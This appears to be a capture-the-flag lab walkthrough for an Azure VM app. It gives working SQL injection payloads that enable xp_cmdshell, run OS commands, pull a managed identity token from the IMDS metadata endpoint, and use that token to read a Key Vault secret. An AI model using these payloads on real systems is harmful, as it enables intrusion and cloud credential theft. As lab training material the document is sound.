# sqli_imds — SQL Injection → IMDS Token Exfiltration

**Difficulty:** Intermediate  
**Category:** Compute / SQL Injection / IMDS

## Scenario

A small web application running on an Azure VM lets users register their names. The app uses Microsoft SQL Server as its database and constructs queries by concatenating raw user input — a classic SQL injection vulnerability.

The VM has a system-assigned managed identity with `Key Vault Secrets User` permissions on a Key Vault containing the flag. Your goal is to exploit the SQL injection vulnerability to execute OS commands via `xp_cmdshell`, reach the Azure IMDS endpoint, obtain the managed identity token, and use it to read the secret from Key Vault.

## Deploy

```shell
cnimbus azure create --app-id sqli_imds
```

## Attack Walkthrough

### Step 1 — Explore the web app

Navigate to `http://<vm_public_ip>`. You'll see a simple form that adds a username to the database and lists recent entries.

### Step 2 — Confirm SQL injection

Submit a username with a single quote to test for injection:

```
test'
```

The app does not return an error (errors are silently caught), but if you submit:

```
test'); INSERT INTO dbo.Users (Name) VALUES ('injected
```

You should see `injected` appear in the list, confirming stacked-query injection.

### Step 3 — Enable xp_cmdshell

Send a payload to enable SQL Server's OS command execution feature:

```
foo'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

### Step 4 — Execute a command and store the output

Use a table variable to capture `xp_cmdshell` output and insert it into the Users table:

```
foo'; DECLARE @o TABLE (line NVARCHAR(4000)); INSERT INTO @o EXEC xp_cmdshell 'whoami'; INSERT INTO dbo.Users (Name) SELECT line FROM @o WHERE line IS NOT NULL;--
```

Refresh the page — you should see `root` (or the SQL Server service account) appear in the list.

### Step 5 — Query the IMDS endpoint for the managed identity token

```
foo'; DECLARE @o TABLE (line NVARCHAR(4000)); INSERT INTO @o EXEC xp_cmdshell 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"'; INSERT INTO dbo.Users (Name) SELECT line FROM @o WHERE line IS NOT NULL;--
```

Refresh the page. The JSON response (including `access_token`) appears in the entries list. Copy the value of `access_token`.

### Step 6 — Read the Key Vault secret

```shell
TOKEN="<access_token from step 5>"
KV_URI="<keyvault_uri>"   # e.g. https://kv-sqli-abcd1234.vault.azure.net

curl -s -H "Authorization: Bearer $TOKEN" \
  "${KV_URI}secrets/flag?api-version=7.4" | python3 -m json.tool
```

The response contains the flag in the `value` field.

### Step 7 — Submit the flag

```shell
cnimbus azure validate --app-id sqli_imds --flag "CUMULONIMBUS{...}"
```

## Teardown

```shell
cnimbus azure destroy --app-id sqli_imds
```

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | Initial Access |
| [T1552.005](https://attack.mitre.org/techniques/T1552/005/) | Unsecured Credentials: Cloud Instance Metadata API | Credential Access |
| [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | Valid Accounts: Cloud Accounts | Defense Evasion |
